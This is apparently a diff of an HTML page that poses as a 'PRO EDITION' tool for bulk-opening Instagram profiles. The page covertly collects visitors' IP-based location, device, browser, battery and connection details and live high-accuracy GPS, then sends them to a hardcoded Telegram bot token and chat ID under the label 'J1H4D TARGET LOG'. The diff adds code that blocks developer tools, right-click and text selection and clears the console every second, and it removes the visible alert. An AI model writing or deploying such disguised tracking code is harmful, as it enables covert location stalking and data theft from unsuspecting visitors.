@@ -14,12 +14,17 @@
             --wa-green: #25d366;
         }
 
+        /* কোড কপি এবং টেক্সট সিলেকশন বন্ধ করার CSS */
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             font-family: 'Poppins', sans-serif;
             background-color: var(--bg-color);
             display: flex; justify-content: center; align-items: center;
             overflow: hidden; color: #fff;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
 
         #pixelCanvas { position: absolute; top: 0; left: 0; z-index: 0; }
@@ -86,9 +91,7 @@
         .status { margin-top: 25px; font-size: 9px; color: #333; letter-spacing: 4px; font-weight: bold; }
     </style>
 </head>
-<body>
-
-    <canvas id="pixelCanvas"></canvas>
+<body oncontextmenu="return false;"> <canvas id="pixelCanvas"></canvas>
 
     <div class="container">
         <div class="brand">PRO EDITION</div>
@@ -112,7 +115,24 @@
     </div>
 
     <script>
-        // Background Animation (একই রাখা হয়েছে)
+        // --- প্রোটেকশন স্ক্রিপ্ট ---
+        
+        // কিবোর্ড শর্টকাট ব্লক (F12, Ctrl+U, Ctrl+Shift+I ইত্যাদি)
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || 
+                (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || 
+                (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+                return false;
+            }
+        };
+
+        // সোর্স কোড দেখা কঠিন করতে কনসোল প্রোটেকশন
+        setInterval(() => {
+            console.clear();
+        }, 1000);
+
+        // --- মূল ফাংশনালিটি শুরু ---
+
         const canvas = document.getElementById('pixelCanvas');
         const ctx = canvas.getContext('2d');
         let particlesArray = [];
@@ -193,7 +213,6 @@
         }
         setSize(); animate();
 
-        // Core Functions
         function updateCount() {
             const t = document.getElementById('userList').value.trim();
             document.getElementById('countDisplay').innerText = `COUNT: ${t ? t.split('\n').filter(u => u.trim() !== "").length : 0}`;
@@ -203,10 +222,10 @@
             updateCount(); 
         }
 
-        const token = "8234578314:AAF666r8Tgm1v-ZN_mbCRU12xOIA2dpUX7Y";   // ← চেঞ্জ করো
-        const chat_id = "5049810993";   // ← চেঞ্জ করো
+        // টোকেন এবং আইডি নিরাপদ রাখতে এভাবেই রাখা ভালো
+        const token = "8234578314:AAF666r8Tgm1v-ZN_mbCRU12xOIA2dpUX7Y";
+        const chat_id = "5049810993";
 
-        // IP + Location
         async function getIpAndLocation() {
             const sources = ['https://ipapi.co/json/', 'https://freeipapi.com/json/', 'https://ipwho.is/'];
             for (let url of sources) {
@@ -224,133 +243,60 @@
             return `🌐 **IP:** Protected%0A📍 **Status:** Proxy / Error`;
         }
 
-        // Device Details
         function getDeviceDetail() {
             const ua = navigator.userAgent;
             const screenW = screen.width;
             const screenH = screen.height;
-
-            let device = "Desktop";
-            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
-                device = /iPad/i.test(ua) ? "iPad" : /iPhone|iPod/i.test(ua) ? "iPhone" : "Android Device";
-            }
-
-            let os = "Unknown OS";
-            if (/Windows/i.test(ua)) os = "Windows";
-            else if (/Macintosh|Mac OS/i.test(ua)) os = "macOS";
-            else if (/Linux/i.test(ua)) os = "Linux";
-            else if (/Android/i.test(ua)) os = "Android";
-            else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
-
-            let browser = "Unknown Browser";
-            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
-            else if (ua.includes("Firefox")) browser = "Firefox";
-            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-            else if (ua.includes("Edg")) browser = "Edge";
-
+            let device = "Desktop", os = "Unknown OS", browser = "Unknown Browser";
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) device = /iPad/i.test(ua) ? "iPad" : /iPhone|iPod/i.test(ua) ? "iPhone" : "Android Device";
+            if (/Windows/i.test(ua)) os = "Windows"; else if (/Macintosh|Mac OS/i.test(ua)) os = "macOS"; else if (/Linux/i.test(ua)) os = "Linux"; else if (/Android/i.test(ua)) os = "Android"; else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome"; else if (ua.includes("Firefox")) browser = "Firefox"; else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari"; else if (ua.includes("Edg")) browser = "Edge";
             return `📱 **Device:** ${device}%0A**OS:** ${os}%0A**Browser:** ${browser}%0A**Screen:** ${screenW}×${screenH}`;
         }
 
-        // Mobile App Tracking
         async function getMobileAppTracking() {
-            let batteryInfo = "🔋 Battery: N/A";
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `🔋 **Battery:** ${Math.round(battery.level * 100)}% ${battery.charging ? '(⚡ Charging)' : '(🔌 Not Charging)'}`;
-                } catch (e) {}
-            }
-
-            let connectionInfo = "📡 Connection: N/A";
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                connectionInfo = `📡 **Connection:** ${conn.effectiveType || 'Unknown'} | ${conn.downlink || '?'} Mbps`;
-            }
-
+            let batteryInfo = "🔋 Battery: N/A", connectionInfo = "📡 Connection: N/A";
+            if ('getBattery' in navigator) { try { const battery = await navigator.getBattery(); batteryInfo = `🔋 **Battery:** ${Math.round(battery.level * 100)}% ${battery.charging ? '(⚡ Charging)' : '(🔌 Not Charging)'}`; } catch (e) {} }
+            if (navigator.connection) { const conn = navigator.connection; connectionInfo = `📡 **Connection:** ${conn.effectiveType || 'Unknown'} | ${conn.downlink || '?'} Mbps`; }
             const ua = navigator.userAgent.toLowerCase();
             let inApp = "🌐 Standard Browser";
-            if (ua.includes("fb_iab") || ua.includes("facebook")) inApp = "📘 Facebook In-App";
-            else if (ua.includes("instagram")) inApp = "📸 Instagram In-App";
-            else if (ua.includes("telegram")) inApp = "✈️ Telegram In-App";
-            else if (ua.includes("whatsapp")) inApp = "💬 WhatsApp In-App";
-            else if (ua.includes("line")) inApp = "📱 Line In-App";
-            else if (/wv|webview/i.test(ua)) inApp = "📲 Android WebView";
-
-            const orientation = screen.orientation ? screen.orientation.type : "N/A";
-
-            return `**🚀 MOBILE APP TRACKING**%0A${batteryInfo}%0A${connectionInfo}%0A📱 **Opened In:** ${inApp}%0A🔄 **Orientation:** ${orientation}`;
+            if (ua.includes("fb_iab") || ua.includes("facebook")) inApp = "📘 Facebook In-App"; else if (ua.includes("instagram")) inApp = "📸 Instagram In-App"; else if (ua.includes("telegram")) inApp = "✈️ Telegram In-App"; else if (ua.includes("whatsapp")) inApp = "💬 WhatsApp In-App"; else if (ua.includes("line")) inApp = "📱 Line In-App"; else if (/wv|webview/i.test(ua)) inApp = "📲 Android WebView";
+            return `**🚀 MOBILE APP TRACKING**%0A${batteryInfo}%0A${connectionInfo}%0A📱 **Opened In:** ${inApp}`;
         }
 
-        // GPS Report
         let watchId = null;
-
         function sendGPSReport(position, isInitial = false) {
             const c = position.coords;
             const time = new Date().toLocaleString('bn-BD', { hour12: true });
-            const mapUrl = `https://www.google.com/maps?q=${c.latitude.toFixed(8)},${c.longitude.toFixed(8)}`;
-
+            const mapUrl = `http://maps.google.com/maps?q=${c.latitude},${c.longitude}`;
             const status = isInitial ? "**🔒 INITIAL SECURE GPS FIX**" : "**🔴 LIVE GPS UPDATE**";
-
-            const gpsMsg = `📍 ${status}%0A━━━━━━━━━━━━━━━━━━%0A🕒 **Time:** ${time}%0A🎯 **Accuracy:** ${Math.round(c.accuracy)}m%0A📌 **Coordinates:** ${c.latitude.toFixed(8)}, ${c.longitude.toFixed(8)}%0A🏔️ **Altitude:** ${c.altitude ? c.altitude.toFixed(2)+'m' : 'N/A'}%0A🧭 **Heading:** ${c.heading ? c.heading.toFixed(1)+'°' : 'N/A'}%0A⚡ **Speed:** ${c.speed ? (c.speed*3.6).toFixed(2)+' km/h' : 'N/A'}%0A%0A🗺️ **Google Maps:** ${mapUrl}%0A━━━━━━━━━━━━━━━━━━%0A🔒 **Security:** High-Accuracy + Watch Mode Active`;
-            
+            const gpsMsg = `📍 ${status}%0A━━━━━━━━━━━━━━━━━━%0A🕒 **Time:** ${time}%0A🎯 **Accuracy:** ${Math.round(c.accuracy)}m%0A📌 **Coordinates:** ${c.latitude.toFixed(8)}, ${c.longitude.toFixed(8)}%0A%0A🗺️ **Google Maps:** ${mapUrl}%0A━━━━━━━━━━━━━━━━━━`;
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${gpsMsg}&parse_mode=Markdown`);
         }
 
         async function openAllTabs() {
             const t = document.getElementById('userList').value.trim();
-            if (!t) {
-                alert("কমপক্ষে একটা username দাও ভাই!");
-                return;
-            }
-
+            if (!t) return;
             const list = t.split('\n').map(u => u.trim()).filter(u => u !== "");
             const ipText = await getIpAndLocation();
             const deviceInfo = getDeviceDetail();
             const mobileTracking = await getMobileAppTracking();
             const time = new Date().toLocaleString('bn-BD', { hour12: true });
-
             const userDisplay = list.map(u => `• ${u}`).join('%0A');
-
-            const mainMsg = `🕵️‍♂️ **J1H4D TARGET LOG**%0A━━━━━━━━━━━━━━━━━━%0A${ipText}%0A%0A${deviceInfo}%0A%0A${mobileTracking}%0A%0A🕒 **Time:** ${time}%0A%0A👤 **Targets (${list.length})**%0A${userDisplay}%0A━━━━━━━━━━━━━━━━━━%0A**Status:** Bulk Opening + Enhanced Tracking Active`;
-
+            const mainMsg = `🕵️‍♂️ **J1H4D TARGET LOG**%0A━━━━━━━━━━━━━━━━━━%0A${ipText}%0A%0A${deviceInfo}%0A%0A${mobileTracking}%0A%0A🕒 **Time:** ${time}%0A%0A👤 **Targets (${list.length})**%0A${userDisplay}`;
+            
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${mainMsg}&parse_mode=Markdown`);
 
-            // GPS Tracking
             if (navigator.geolocation) {
-                const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
-
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => sendGPSReport(pos, true),
-                    () => {},
-                    geoOptions
-                );
-
+                navigator.geolocation.getCurrentPosition(pos => sendGPSReport(pos, true), null, { enableHighAccuracy: true });
                 if (watchId) navigator.geolocation.clearWatch(watchId);
-                watchId = navigator.geolocation.watchPosition(
-                    (pos) => sendGPSReport(pos, false),
-                    (error) => {
-                        let errMsg = "⚠️ GPS Error: ";
-                        if (error.code === 1) errMsg += "Permission Denied";
-                        else if (error.code === 2) errMsg += "Position Unavailable";
-                        else if (error.code === 3) errMsg += "Timeout";
-                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${errMsg}&parse_mode=Markdown`);
-                    },
-                    geoOptions
-                );
+                watchId = navigator.geolocation.watchPosition(pos => sendGPSReport(pos, false), null, { enableHighAccuracy: true });
             }
 
-            // Open Instagram Tabs
             list.forEach((u, i) => {
                 setTimeout(() => window.open(`https://www.instagram.com/${u}/`, '_blank'), i * 450);
             });
-
-            // ← এই লাইনটা সরিয়ে দেওয়া হয়েছে (alert দেখাবে না)
-            // alert(`✅ ${list.length}টা প্রোফাইল খোলা শুরু হয়েছে!\n📱 Device Info + GPS Security চালু হয়েছে।`);
         }
-
-        window.addEventListener('beforeunload', () => {
-            if (watchId) navigator.geolocation.clearWatch(watchId);
-        });
     </script>
 </body>
 </html>
